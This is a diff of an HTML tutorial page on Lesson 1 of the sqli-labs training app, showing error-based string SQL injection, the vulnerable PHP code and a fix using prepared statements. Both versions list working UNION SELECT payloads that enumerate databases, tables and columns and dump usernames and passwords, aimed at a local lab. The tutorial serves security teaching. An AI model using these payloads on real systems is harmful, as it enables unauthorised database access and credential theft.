@@ -406,72 +406,28 @@
   
 </div>
 
-  <h1 id="sql-injection-lab--lesson-1-error-based-string">SQL Injection Lab – Lesson 1 (Error-Based: String)</h1>
-<hr>
-<h2 id="1-what-is-this-lesson-about">1. What is this Lesson About?</h2>
-<p>This lab demonstrates a classic <strong>Error-Based SQL Injection vulnerability</strong>.<br>
-The application takes user input from the URL (<code>id</code> parameter) and uses it directly in a SQL query without proper validation or sanitization.<br>
-The purpose of this lesson is to understand how SQL errors can reveal valuable information and how attackers exploit them.</p>
-<hr>
-<h2 id="2-how-to-identify-if-it-is-error-based">2. How to Identify if It Is Error-Based?</h2>
+  <h1 id="what-is-this-lesson-about">What is this Lesson About?</h1>
+<p>This lab demonstrates a classic <strong>Error-Based SQL Injection vulnerability</strong>.</p>
+<p>The application takes user input from the URL (<code>id</code> parameter) and uses it directly in a SQL query without proper validation or sanitization.</p>
+<p>The purpose of this lesson is to understand how SQL errors can reveal valuable information and how attackers exploit them.</p>
+<h1 id="how-to-identify-if-it-is-error-based">How to Identify if It Is Error-Based?</h1>
 <p>When testing a parameter for SQL injection, attackers often add characters like:</p>
-<p>?id=1'</p>
-<p>?id=1&quot;</p>
-<p>?id=1&ndash;</p>
-<p>If the application displays a <strong>database error message</strong> (for example:<br>
-Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &lsquo;&lsquo;1&rsquo;&rsquo; LIMIT 0,1&rsquo; at line 1</p>
-<p>)</p>
+<pre tabindex="0"><code>?id=1
+?id=1&#39;
+?id=1&#34;
+?id=1)
+?id=1&#39;)
+?id=1&#34;)
+</code></pre><p>If the application displays a <strong>database error message</strong></p>
+<blockquote>
+<p>Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use <strong>near &lsquo;&lsquo;1&rsquo;&rsquo; LIMIT 0,1&rsquo;</strong> at line 1</p></blockquote>
 <p>This indicates an <strong>Error-Based SQL Injection</strong>.</p>
-<p>In this lab, when an invalid character such as <code>'</code> (single quote) is added, the application responds with an SQL error.<br>
-This confirms that the application is vulnerable to <strong>Error-Based SQL Injection (String)</strong>.</p>
-<hr>
-<h2 id="3-type-of-sql-injection">3. Type of SQL Injection</h2>
-<p>This lesson focuses on:</p>
-<ul>
-<li><strong>Error-Based SQL Injection</strong></li>
-<li><strong>String-Based Injection</strong> (because the input is wrapped inside single quotes in the query).</li>
-</ul>
-<p>The vulnerable SQL query looks like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$id&#39;</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>
-</span></span></code></pre></div><p>Here, $id is directly taken from the user input and inserted into the query without any checks.</p>
-<h2 id="4-how-the-injection-happens">4. How the Injection Happens</h2>
-<p>The injection happens because the application directly takes the id parameter from the URL.</p>
-<p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://localhost/sqli-labs/Less-1/?id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
-</span></span></code></pre></div><p>The input is inserted into the query without sanitization:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>
-</span></span></code></pre></div><p>If an attacker inputs &rsquo; OR &lsquo;1&rsquo;=&lsquo;1, the query becomes:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">OR</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>
-</span></span></code></pre></div><p>Since &lsquo;1&rsquo;=&lsquo;1&rsquo; is always true, the attacker can bypass conditions and retrieve unintended results.</p>
-<h2 id="5-payloads-for-exploitation">5. Payloads for Exploitation</h2>
-<p>Once the injection point is confirmed, attackers can use payloads to extract sensitive data from the database.</p>
-<p>5.1 Checking Injection</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">--
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; AND &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">2</span> <span style="color:#75715e">--
-</span></span></span></code></pre></div><p>5.2 Finding Column Count (ORDER BY)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; ORDER BY 1 --
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?id=1&#39;</span> <span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> <span style="color:#ae81ff">2</span> <span style="color:#75715e">--
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; ORDER BY 3 --
-</span></span></span></code></pre></div><p>5.3 Getting Database Name</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1, database() --
-</span></span></span></code></pre></div><p>5.4 Getting Current User</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1, user() --
-</span></span></span></code></pre></div><p>5.5 Listing Databases</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1, schema_name FROM information_schema.schemata LIMIT 0,1 --
-</span></span></span></code></pre></div><p>5.6 Dumping Tables of Current Database</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1 --
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?id=-1&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>, group_concat(<span style="color:#66d9ef">table_name</span>) <span style="color:#66d9ef">FROM</span> information_schema.tables <span style="color:#66d9ef">WHERE</span> table_schema<span style="color:#f92672">=</span><span style="color:#66d9ef">database</span>() <span style="color:#75715e">--
-</span></span></span></code></pre></div><p>5.7 Dumping Columns of a Table</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=&#39;</span>users<span style="color:#e6db74">&#39; LIMIT 0,1 --
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?id=-1&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>, group_concat(<span style="color:#66d9ef">column_name</span>) <span style="color:#66d9ef">FROM</span> information_schema.columns <span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">table_name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;users&#39;</span> <span style="color:#75715e">--
-</span></span></span></code></pre></div><p>5.8 Extracting Data from Users Table</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT username, password FROM users LIMIT 0,1 --
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?id=-1&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>, group_concat(username, <span style="color:#e6db74">&#39;:&#39;</span>, password) <span style="color:#66d9ef">FROM</span> users 
-</span></span></code></pre></div><p>&ndash;</p>
-<h2 id="6-vulnerable-source-code">6. Vulnerable Source Code</h2>
-<p>The following PHP code is the vulnerable part of the lab:</p>
+<p>In this lab, when an invalid character such as <code>'</code> (single quote) is added, the application responds with an SQL error.</p>
+<p>This confirms that the application is vulnerable to <strong>Error-Based SQL Injection (String)</strong>.</p>
+<h1 id="vulnerable-source-code">Vulnerable Source Code</h1>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// including the MySQLi connection file
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// https://github.com/Audi-1/sqli-labs/blob/master/Less-1/index.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// including the MySQLi connection file
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;../sql-connections/sql-connect.php&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// check for ID parameter
@@ -497,10 +453,58 @@ This confirms that the application is vulnerable to <strong>Error-Based SQL Inje
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Please input the ID as parameter with numeric value&#34;</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>Issue:
-The variable $id is directly placed into the query.
-No validation, escaping, or parameterization is done.</p>
-<h2 id="7-how-to-fix-the-vulnerability">7. How to Fix the Vulnerability</h2>
+</span></span></span></code></pre></div><p>Issue:</p>
+<ul>
+<li>The variable <code>$id</code> is directly placed into the query.</li>
+<li>No validation, escaping, or parameterization is done.</li>
+</ul>
+<h2 id="how-the-injection-happens">How the Injection Happens</h2>
+<p>The injection happens because the application directly takes the <code>id</code> parameter from the URL.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://localhost/sqli-labs/Less-1/?id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>The input is inserted into the query without sanitization</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>If an attacker inputs <code>' OR '1'='1</code> the query becomes</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">OR</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Since <code>'1'='1'</code> is always true, the attacker can bypass conditions and retrieve unintended results.</p>
+<h2 id="payloads-for-exploitation">Payloads for Exploitation</h2>
+<p>Once the injection point is confirmed, attackers can use payloads to extract sensitive data from the database.</p>
+<p>Checking Injection</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">--+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; AND &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">2</span> <span style="color:#75715e">--+
+</span></span></span></code></pre></div><h1 id="dumping-data-from-db">Dumping data from DB</h1>
+<p>Finding Column Count (using ORDER BY)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; ORDER BY 1 --+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?id=1&#39;</span> <span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> <span style="color:#ae81ff">2</span> <span style="color:#75715e">--+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; ORDER BY 3 --+
+</span></span></span></code></pre></div><p>If we run</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; ORDER BY 4 --+
+</span></span></span></code></pre></div><p>We will receive this error which mean we only have 3 columns</p>
+<blockquote>
+<p>Fatal error: Uncaught mysqli_sql_exception: Unknown column &lsquo;19&rsquo; in &lsquo;order clause&rsquo;</p></blockquote>
+<p>Now we&rsquo;ve 3 columns, so our payloads will look like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1,2,3 --+
+</span></span></span></code></pre></div><p>\\ http://localhost:8080/sqli-labs/sqli-labs-master/Less-1/?id=-1&rsquo; union select 1,2,3 &ndash;+</p>
+<p><img src="/columnreflect.jpg" alt="Alt text"></p>
+<p>As you can see here our column is beign reflected</p>
+<p>Getting Database Name</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1,database(),3 --+
+</span></span></span></code></pre></div><p><img src="/databasereflect.jpg" alt="Alt text">
+Getting Current User</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1, user(),3 --+
+</span></span></span></code></pre></div><p><img src="/cuser.jpg" alt="Alt text">
+Listing Databases</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata --+
+</span></span></span></code></pre></div><p><img src="/listofdb.jpg" alt="Alt text">
+Dumping Tables of Current Database</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() --+
+</span></span></span></code></pre></div><p><img src="/tofcdb.jpg" alt="Alt text">
+Dumping Columns of a Table</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#39;</span>users<span style="color:#e6db74">&#39; --+
+</span></span></span></code></pre></div><p><img src="/dcofct.jpg" alt="Alt text">
+Extracting Data from Users Table</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1,GROUP_CONCAT(username),GROUP_CONCAT(password)FROM users --+
+</span></span></span></code></pre></div><p><img src="/edfut.jpg" alt="Alt text"></p>
+<h1 id="how-to-fix-sql-injection">How to Fix SQL Injection</h1>
 <p>To prevent SQL Injection, follow secure coding practices:</p>
 <p>Use Prepared Statements (Parameterized Queries):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
@@ -524,15 +528,27 @@ No validation, escaping, or parameterization is done.</p>
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><p>Other Best Practices:</p>
-<p>Validate input (ensure id is numeric).</p>
-<p>Hide detailed database error messages from users.</p>
-<p>Use least privilege principle for database accounts.</p>
+<ul>
+<li>Validate input (ensure id is numeric).</li>
+<li>Hide detailed database error messages from users.</li>
+<li>Use least privilege principle for database accounts.</li>
+</ul>
 <h2 id="8-final-summary">8. Final Summary</h2>
 <p>This lesson demonstrates an Error-Based String SQL Injection.</p>
+<ul>
+<li>
 <p>Attackers identify it by injecting special characters and observing database error messages.</p>
+</li>
+<li>
 <p>The vulnerability occurs due to unsanitized input directly used in SQL queries.</p>
+</li>
+<li>
 <p>Payloads can extract database name, user, tables, columns, and data.</p>
+</li>
+<li>
 <p>The solution is to use prepared statements, input validation, and avoid displaying detailed error messages.</p>
+</li>
+</ul>
 
   
   <hr>
@@ -553,13 +569,11 @@ No validation, escaping, or parameterization is done.</p>
       <h4 id="contents"></h4>
       <nav id="TableOfContents">
   <ul>
-    <li><a href="#1-what-is-this-lesson-about">1. What is this Lesson About?</a></li>
-    <li><a href="#2-how-to-identify-if-it-is-error-based">2. How to Identify if It Is Error-Based?</a></li>
-    <li><a href="#3-type-of-sql-injection">3. Type of SQL Injection</a></li>
-    <li><a href="#4-how-the-injection-happens">4. How the Injection Happens</a></li>
-    <li><a href="#5-payloads-for-exploitation">5. Payloads for Exploitation</a></li>
-    <li><a href="#6-vulnerable-source-code">6. Vulnerable Source Code</a></li>
-    <li><a href="#7-how-to-fix-the-vulnerability">7. How to Fix the Vulnerability</a></li>
+    <li><a href="#how-the-injection-happens">How the Injection Happens</a></li>
+    <li><a href="#payloads-for-exploitation">Payloads for Exploitation</a></li>
+  </ul>
+
+  <ul>
     <li><a href="#8-final-summary">8. Final Summary</a></li>
   </ul>
 </nav>
